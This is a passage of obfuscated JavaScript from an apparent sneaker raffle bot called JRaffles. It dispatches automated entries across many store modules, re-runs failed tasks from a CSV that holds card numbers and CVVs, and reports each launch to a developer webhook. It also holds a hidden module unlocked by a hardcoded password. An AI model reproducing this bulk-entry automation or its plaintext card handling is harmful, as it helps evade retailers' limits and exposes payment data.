                        for (var _0x146a78 of _0x4fd9f4) {
                            const _0x40a43d = _0x146a78['name']['includes'](_0x44e875);
                            if (!_0x40a43d)
                                continue;
                            for (mode of _0x146a78['modules']) {
                                if (mode['name'] == _0x46526b) {
                                    console['log']('Running\x20' + _0x136200['cyan'](mode['name'])), await mode['function'](mode, [_0x8ab0f0[_0x35fac6]], _0x58a74f);
                                    var _0x2a1fdb = _0x33e2d1['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x190b67['writeFileSync']('../failed-tasks.csv', _0x2a1fdb);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x4fb0b1 = await _0x136b91['get']('Answer');
                    if (_0x4fb0b1['Answer']['toLowerCase']() == 'y') {
                        _0x190b67['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0x2121c3(0x3e8);
                        return;
                    }
                    if (_0x4fb0b1['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0x2121c3(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0x2121c3(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x255008(_0x3a368c) {
    var _0x30a4e1 = await _0x40f8ee(), _0x202a41 = _0x190b67['readFileSync']('../failed-tasks.csv', 'utf-8'), _0xd74694 = _0x32de35['parse'](_0x202a41, { 'header': !![] })['data'];
    for (var _0x409ce6 = 0x0; _0x409ce6 < _0xd74694['length']; _0x409ce6++) {
        var _0x3d8a56 = _0xd74694[_0x409ce6]['Store'], _0x2ba7af = _0xd74694[_0x409ce6]['Mode'];
        for (var _0x801fc of _0x4fd9f4) {
            const _0x7c44f8 = _0x801fc['name']['includes'](_0x3d8a56);
            if (_0x7c44f8)
                for (mode of _0x4fd9f4[_0x801fc]['modules']) {
                    const _0x1aa1e7 = mode['name']['includes'](_0x2ba7af);
                    _0x1aa1e7 && (_0x3a368c = mode['name'], await mode['function'](_0x3a368c, _0xd74694[_0x409ce6], _0x30a4e1));
                }
        }
    }
}
async function _0x5517b2() {
    await _0x35c377(), console['clear']();
    _0x120b49['threads'] > 0x5 && (_0x120b49['threads'] = 0x5);
    if (_0x3e659f != 'devkey' && _0x3e659f != 'devhook') {
        let _0x597cdf = await _0x2e6e40['autoUpdate']();
        if (_0x597cdf === 'yes')
            return _0x548d4e('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x8f3d6b == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x2121c3(0x2710);
        ;
    }
    await _0x212ea2(_0x8f3d6b);
    if (_0x2de72e === ![])
        return console['log']('Closing\x20Browser'), await _0x2121c3(0xbb8);
    else
        try {
            var _0x33615f = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x380ae8
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x3e659f
                    }
                ]
            }];
            const _0x3c592f = { 'embeds': _0x33615f };
            var _0x4585ce = await _0x12b988(null, null, 'open', ![]);
            const _0x338610 = { 'openDEVMSG': { 'embeds': [_0x4585ce] } };
            await _0x5f1090(_0x5919d2, _0x338610['openDEVMSG']);
            async function _0x34ef28() {
                _0x3aeb59('JRaffles\x20' + _0x3e659f), console['clear'](), console['log']('Hello\x20' + _0x136200['cyan']('' + _0x380ae8) + ',\x20Welcome\x20to\x20JRaffles\x20' + _0x3e659f), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x5d3f5b = 0x0; _0x5d3f5b < _0x4fd9f4['length'] - 0x4; _0x5d3f5b++) {
                    if (_0x5d3f5b >= 0xa) {
                        console['log']('\x20(' + _0x5d3f5b + ')\x20[' + _0x4fd9f4[_0x5d3f5b]['name'] + ']');
                        continue;
                    }
                    if (_0x4fd9f4[_0x5d3f5b]['name'] === 'Reload\x20Settings' || _0x4fd9f4[_0x5d3f5b]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x5d3f5b + ')\x20\x20[' + _0x4fd9f4[_0x5d3f5b]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x4fd9f4['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x4fd9f4['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x4fd9f4['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x4fd9f4['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x575b1a();
                if (taskModule > _0x4fd9f4['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x2121c3(0x3e8), _0x34ef28();
                if (_0x4fd9f4[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x92773d(_0x4fd9f4[taskModule]['modules']);
                    var _0x565cc8 = _0x4fd9f4[taskModule]['modules'][taskFunction];
                    console['clear']();
                    try {
                        if (taskFunction == 0x3) {
                            var _0x11132b = await _0x40f8ee();
                            await _0x565cc8['function'](_0x565cc8, _0x11132b);
                        }
                        if (taskFunction == 0x2) {
                            var _0x11132b = await _0x40f8ee(), _0x249516 = await _0x3b4f03(_0x565cc8);
                            _0x120b49['shuffleTasks'] && await _0x501569(_0x249516), await _0x565cc8['function'](_0x565cc8, _0x249516, _0x11132b);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x11132b = await _0x40f8ee(), _0x249516 = await _0x3b4f03(_0x565cc8);
                                _0x120b49['shuffleTasks'] && await _0x501569(_0x249516), await _0x565cc8['function'](_0x565cc8, _0x249516, _0x11132b);
                            } else {
                                if (taskFunction == 0x1) {
                                    var _0x11132b = await _0x40f8ee();
                                    await _0x565cc8['function'](_0x565cc8, _0x11132b);
                                }
                            }
                        }
                    } catch (_0xedd83c) {
                        console['log'](_0xedd83c), await _0x2121c3(0x7d0);
                    }
                    return _0x34ef28();
                }
                if (_0x4fd9f4[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x92773d(_0x4fd9f4[taskModule]['modules']);
                        var _0x565cc8 = _0x4fd9f4[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x11132b = await _0x40f8ee(), _0x562707 = await _0x3b4f03(_0x565cc8);
                            _0x120b49['shuffleTasks'] && await _0x501569(_0x562707), await _0x565cc8['function'](_0x565cc8, _0x562707, _0x11132b);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x11132b = await _0x40f8ee(), _0x562707 = await _0x3b4f03(_0x565cc8);
                                _0x120b49['shuffleTasks'] && await _0x501569(_0x562707), await _0x565cc8['function'](_0x565cc8, _0x562707, _0x11132b);
                            }
                        }
                    } catch (_0x4606b5) {
                        console['log'](_0x4606b5), await _0x2121c3(0xfa0);
                    }
                    return _0x34ef28();
                }
                if (_0x4fd9f4[taskModule]['name'] == 'Overkill') {
                    try {
                        taskFunction = await _0x92773d(_0x4fd9f4[taskModule]['modules']);
                        var _0x565cc8 = _0x4fd9f4[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x11132b = await _0x40f8ee(), _0x562707 = await _0x3b4f03(_0x565cc8);
                            _0x120b49['shuffleTasks'] && await _0x501569(_0x562707), await _0x565cc8['function'](_0x565cc8, _0x562707, _0x11132b);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x11132b = await _0x40f8ee(), _0x562707 = await _0x3b4f03(_0x565cc8);
                                _0x120b49['shuffleTasks'] && await _0x501569(_0x562707), await _0x565cc8['function'](_0x565cc8, _0x562707, _0x11132b);
                            }
                        }
                    } catch (_0x477b77) {
                        console['log'](_0x477b77), await _0x2121c3(0xfa0);
                    }
                    return _0x34ef28();
                }
                if (_0x4fd9f4[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x92773d(_0x4fd9f4[taskModule]['modules']);
                    var _0x565cc8 = _0x4fd9f4[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x11132b = await _0x40f8ee();
                        return await _0x565cc8['function'](_0x565cc8, _0x11132b), _0x34ef28();
                    }
                    var _0x11132b = await _0x40f8ee(), _0x4da6ad = await _0x3b4f03(_0x565cc8);
                    return _0x120b49['shuffleTasks'] && await _0x501569(_0x4da6ad), await _0x565cc8['function'](_0x565cc8, _0x4da6ad, _0x11132b), _0x34ef28();
                }
                if (_0x4fd9f4[taskModule]['name'] == 'OneBlockDown') {
                    taskFunction = await _0x92773d(_0x4fd9f4[taskModule]['modules']);
                    var _0x565cc8 = _0x4fd9f4[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x11132b = await _0x40f8ee(), _0x4da6ad = await _0x3b4f03(_0x565cc8);
                    return _0x120b49['shuffleTasks'] && await _0x501569(_0x4da6ad), await _0x565cc8['function'](_0x565cc8, _0x4da6ad, _0x11132b), _0x34ef28();
                }
                if (_0x4fd9f4[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x92773d(_0x4fd9f4[taskModule]['modules']);
                    var _0x565cc8 = _0x4fd9f4[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x11132b = await _0x40f8ee(), _0x4da6ad = await _0x3b4f03(_0x565cc8);
                    return _0x120b49['shuffleTasks'] && await _0x501569(_0x4da6ad), await _0x565cc8['function'](_0x565cc8, _0x4da6ad, _0x11132b), _0x34ef28();
                }
                if (_0x4fd9f4[taskModule]['name']['includes']('BACKDOOR')) {
                    taskFunction = await _0x92773d(_0x4fd9f4[taskModule]['modules']);
                    var _0x565cc8 = _0x4fd9f4[taskModule]['modules'][taskFunction], _0x11132b = await _0x40f8ee(), _0x492897 = await _0x3b4f03(_0x565cc8);
                    return _0x120b49['shuffleTasks'] && await _0x501569(_0x492897), await _0x565cc8['function'](_0x565cc8, _0x492897, _0x11132b), await _0x2121c3(0x1388), _0x34ef28();
                }
                if (_0x4fd9f4[taskModule]['name'] == 'EQL') {
                    taskFunction = await _0x92773d(_0x4fd9f4[taskModule]['modules']);
                    var _0x565cc8 = _0x4fd9f4[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x11132b = await _0x40f8ee(), _0x4da6ad = await _0x3b4f03(_0x565cc8);
                    return _0x120b49['shuffleTasks'] && await _0x501569(_0x4da6ad), await _0x565cc8['function'](_0x565cc8, _0x4da6ad, _0x11132b), _0x34ef28();
                } else {
                    if (_0x4fd9f4[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x92773d(_0x4fd9f4[taskModule]['modules']);
                        var _0x565cc8 = _0x4fd9f4[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x11132b = await _0x40f8ee(), _0x3056c4 = await _0x3b4f03(_0x565cc8);
                            return _0x120b49['shuffleTasks'] && await _0x501569(_0x3056c4), await _0x565cc8['function'](_0x565cc8, _0x3056c4, _0x11132b), _0x34ef28();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x11132b = await _0x40f8ee();
                                return await _0x565cc8['function'](_0x565cc8, null, _0x11132b), _0x34ef28();
                            }
                        }
                        ;
                    } else {
                        if (_0x4fd9f4[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x92773d(_0x4fd9f4[taskModule]['modules']);
                            var _0x565cc8 = _0x4fd9f4[taskModule]['modules'][taskFunction], _0x11132b = await _0x40f8ee(), _0x492897 = await _0x3b4f03(_0x565cc8);
                            return _0x120b49['shuffleTasks'] && await _0x501569(_0x492897), await _0x565cc8['function'](_0x565cc8, _0x492897, _0x11132b), await _0x2121c3(0x1388), _0x34ef28();
                        } else {
                            if (_0x4fd9f4[taskModule]['name'] == 'Google\x20Forms') {
                                taskFunction = await _0x92773d(_0x4fd9f4[taskModule]['modules']);
                                var _0x565cc8 = _0x4fd9f4[taskModule]['modules'][taskFunction], _0x11132b = await _0x40f8ee(), _0x492897 = await _0x3b4f03(_0x565cc8);
                                return _0x120b49['shuffleTasks'] && await _0x501569(_0x492897), await _0x565cc8['function'](_0x565cc8, _0x492897, _0x11132b), await _0x2121c3(0x1388), _0x34ef28();
                            } else {
                                if (_0x4fd9f4[taskModule]['name'] == 'OQIUM\x20Store') {
                                    taskFunction = await _0x92773d(_0x4fd9f4[taskModule]['modules']);
                                    var _0x565cc8 = _0x4fd9f4[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0) {
                                        var _0x11132b = await _0x40f8ee(), _0x3056c4 = await _0x3b4f03(_0x565cc8);
                                        return _0x120b49['shuffleTasks'] && await _0x501569(_0x3056c4), await _0x565cc8['function'](_0x565cc8, _0x3056c4, _0x11132b), _0x34ef28();
                                    } else {
                                        if (taskFunction == 0x1) {
                                            var _0x11132b = await _0x40f8ee();
                                            return await _0x565cc8['function'](_0x565cc8, null, _0x11132b), _0x34ef28();
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x4fd9f4[taskModule]['name'] == 'BOUNCEWEAR') {
                                        taskFunction = await _0x92773d(_0x4fd9f4[taskModule]['modules']);
                                        var _0x565cc8 = _0x4fd9f4[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0)
                                            await bwAcc('https://bouncewear.com/nl/account/register', _0x565cc8);
                                        else {
                                            if (taskFunction == 0x1) {
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x4fd9f4[taskModule]['name'] == 'PATTA') {
                                            taskFunction = await _0x92773d(_0x4fd9f4[taskModule]['modules']);
                                            var _0x565cc8 = _0x4fd9f4[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x11132b = await _0x40f8ee(), _0x3bc9e0 = await _0x3b4f03(_0x565cc8);
                                                return _0x120b49['shuffleTasks'] && await _0x501569(_0x3bc9e0), await _0x565cc8['function'](_0x565cc8, _0x3bc9e0, _0x11132b), _0x34ef28();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x11132b = await _0x40f8ee(), _0x3bc9e0 = await _0x3b4f03(_0x565cc8);
                                                    return _0x120b49['shuffleTasks'] && await _0x501569(_0x3bc9e0), await _0x565cc8['function'](_0x565cc8, _0x3bc9e0, _0x11132b), _0x34ef28();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x4fd9f4[taskModule]['name'] == 'SLAM\x20JAM') {
                                                taskFunction = await _0x92773d(_0x4fd9f4[taskModule]['modules']);
                                                var _0x565cc8 = _0x4fd9f4[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x11132b = await _0x40f8ee(), _0x3a87c9 = await _0x3b4f03(_0x565cc8);
                                                    return _0x120b49['shuffleTasks'] && await _0x501569(_0x3a87c9), await _0x565cc8['function'](_0x565cc8, _0x3a87c9, _0x11132b), _0x34ef28();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x11132b = await _0x40f8ee(), _0x3a87c9 = await _0x3b4f03(_0x565cc8);
                                                        return _0x120b49['shuffleTasks'] && await _0x501569(_0x3a87c9), await _0x565cc8['function'](_0x565cc8, _0x3a87c9, _0x11132b), _0x34ef28();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x4fd9f4[taskModule]['name'] == 'KICKZ') {
                                                    taskFunction = await _0x92773d(_0x4fd9f4[taskModule]['modules']);
                                                    var _0x565cc8 = _0x4fd9f4[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x11132b = await _0x40f8ee(), _0x7da61c = await _0x3b4f03(_0x565cc8);
                                                        return _0x120b49['shuffleTasks'] && await _0x501569(_0x7da61c), await _0x565cc8['function'](_0x565cc8, _0x7da61c, _0x11132b), _0x34ef28();
                                                    } else {
                                                        if (taskFunction == 0x1) {
                                                            var _0x11132b = await _0x40f8ee(), _0x7da61c = await _0x3b4f03(_0x565cc8);
                                                            return _0x120b49['shuffleTasks'] && await _0x501569(_0x7da61c), await _0x565cc8['function'](_0x565cc8, _0x7da61c, _0x11132b), _0x34ef28();
                                                        }
                                                    }
                                                    ;
                                                } else {
                                                    if (_0x4fd9f4[taskModule]['name'] == 'KICKZ') {
                                                        taskFunction = await _0x92773d(_0x4fd9f4[taskModule]['modules']);
                                                        var _0x565cc8 = _0x4fd9f4[taskModule]['modules'][taskFunction];
                                                        console['clear']();
                                                        if (taskFunction == 0x0) {
                                                            var _0x11132b = await _0x40f8ee(), _0x7da61c = await _0x3b4f03(_0x565cc8);
                                                            return _0x120b49['shuffleTasks'] && await _0x501569(_0x7da61c), await _0x565cc8['function'](_0x565cc8, _0x7da61c, _0x11132b), _0x34ef28();
                                                        } else {
                                                            if (taskFunction == 0x1) {
                                                                var _0x11132b = await _0x40f8ee(), _0x7da61c = await _0x3b4f03(_0x565cc8);
                                                                return _0x120b49['shuffleTasks'] && await _0x501569(_0x7da61c), await _0x565cc8['function'](_0x565cc8, _0x7da61c, _0x11132b), _0x34ef28();
                                                            }
                                                        }
                                                        ;
                                                    } else {
                                                        if (_0x4fd9f4[taskModule]['name'] == 'ADIDAS\x20CONFIRMED') {
                                                            taskFunction = await _0x92773d(_0x4fd9f4[taskModule]['modules']);
                                                            var _0x565cc8 = _0x4fd9f4[taskModule]['modules'][taskFunction];
                                                            console['clear']();
                                                            if (taskFunction == 0x0 || taskFunction == 0x1 || taskFunction == 0x2 || taskFunction == 0x3 || taskFunction == 0x4) {
                                                                var _0x11132b = await _0x40f8ee(), _0x503ba6 = await _0x3b4f03(_0x565cc8);
                                                                return _0x120b49['shuffleTasks'] && await _0x501569(_0x503ba6), await _0x565cc8['function'](_0x503ba6, _0x11132b), _0x34ef28();
                                                            }
                                                        } else {
                                                            if (_0x4fd9f4[taskModule]['name'] == 'Seven\x20Store')
                                                                return console['log']('returning\x20to\x20menu'), await _0x2121c3(0x3e8), _0x34ef28();
                                                            else {
                                                                if (_0x4fd9f4[taskModule]['name'] == 'Paypal\x20Verification') {
                                                                    var _0x246fbe = _0x4fd9f4[taskModule]['name'], _0x11132b = await _0x40f8ee();
                                                                    return await _0x1c80e5(_0x246fbe, _0x11132b), _0x34ef28();
                                                                } else {
                                                                    if (_0x4fd9f4[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                        taskFunction = await _0x92773d(_0x4fd9f4[taskModule]['modules']);
                                                                        var _0x565cc8 = _0x4fd9f4[taskModule]['modules'][taskFunction];
                                                                        return await _0x565cc8['function'](_0x565cc8), _0x34ef28();
                                                                    } else {
                                                                        if (_0x4fd9f4[taskModule]['name'] == 'Change\x20Settings') {
                                                                            console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                            var _0x34aac3 = 0x0;
                                                                            for (const _0x6c000 in _0x120b49) {
                                                                                console['log']('(' + _0x34aac3 + ')\x20' + _0x6c000 + '\x20:\x20' + _0x120b49[_0x6c000]), _0x34aac3++;
                                                                            }
                                                                            console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x34aac3 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                            var _0x337b7d = await _0x5a7451();
                                                                            if (_0x337b7d == _0x34aac3)
                                                                                return _0x34ef28();
                                                                            console['clear'];
                                                                            var _0x5c4f01 = 0x0;
                                                                            for (var _0x407bdd in _0x120b49) {
                                                                                if (_0x337b7d == _0x5c4f01) {
                                                                                    console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x407bdd + '\x20:'), _0x120b49[_0x407bdd] = await _0x3106d5(), _0x190b67['writeFileSync']('../settings.json', JSON['stringify'](_0x120b49));
                                                                                    break;
                                                                                } else
                                                                                    _0x5c4f01++;
                                                                            }
                                                                            return console['log']('Settings\x20Saved!'), await _0x2121c3(0xbb8), _0x34ef28();
                                                                        } else {
                                                                            if (_0x4fd9f4[taskModule]['name'] == 'Reload\x20Settings')
                                                                                return console['log']('Reloading\x20settings'), await _0x35c377(), _0x34ef28();
                                                                            else {
                                                                                if (taskModule == 0x45) {
                                                                                    _0x4fd9f4[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                                    var _0xefcd63 = await _0x3bcc66();
                                                                                    _0xefcd63 == 'ModuleVoorDeBoys' ? (await afewScraper(), await _0x5978b3(), await afewFunction(_0x4e08b2[_0x15541c], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x2121c3(0xbb8));
                                                                                } else {
                                                                                }
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            try {
                await _0x34ef28();
            } catch (_0xc6b4b6) {
                return console['log'](_0xc6b4b6), await _0x2121c3(0x2710), _0x34ef28();
            }
        } catch (_0x39b3f8) {
            return console['log'](_0x39b3f8), await _0x2121c3(0x3a98);
        }
}
;
_0x3aeb59('JRaffles\x20' + _0x3e659f);
try {
    _0x35c377(), _0x5517b2();
} catch (_0x5bea9a) {
    console['log'](_0x5bea9a);
}